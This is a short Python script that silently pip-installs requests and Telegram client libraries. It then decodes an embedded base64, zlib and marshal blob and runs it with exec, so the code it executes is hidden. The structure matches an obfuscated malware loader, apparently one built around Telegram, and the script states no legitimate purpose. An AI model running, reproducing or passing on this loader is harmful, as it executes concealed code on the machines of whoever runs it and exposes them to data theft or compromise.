import subprocess
import sys
import base64
import zlib
import marshal
import os
print ("-1")
subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# DATA
DATA = "eJxlkEtrE1EUx+9zZq6NFLEBUeLGjQEtNm1JWkJhpOKmCEpRM5thknuapp1HmTtp2qyydOnOrMSVoO3Cr+A3MBBoet24ceFO6ELoyrl9UMFz4dzzP4/ffbTQP2Zd7Cfvc/cOSSRxiCLsYWxiEhKPSOpRyTxGEGCgh/wAn494HCxp9U1k5zUHbGkfkPPaIvIE8K0i+s+AgTh0LvvyU4hZV3qf3ENzSOEewaiRa5PZow3Uw2Xxy7SUsaaPk+xZf7Zaq1YeLSzW5haWXfepr15uN57Mv1pfqr3oNavB7kNYfe1Vgvm1btxwV5+HNB9ma59DbhA8S7Yh7juzCpTqJLEmabNMtN3aDDK/I7Ujk1Y3gjgrT2kngxDaaRCl5paaJEqLZpL5Z4iUmxzNtS5csPw4iOBKbXRC0CzZgVjjDX1dQSz9S/ondGLedOrUVZZ24vaKdupRIrshrKQ3z/4DIbWeu98UY/wT3fqOxI9CfSAm12YG9rEl3oqxdXtAJ9N3hluj6fuDwjEXbx4M2ZiXPtyYMPuIFUesOGx/wd9Yccwqfyiy7h7x0oiXTtVUDv4441L6lXK3YP8FCVOHqQ=="
secure_data = DATA
payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
exec(payload)
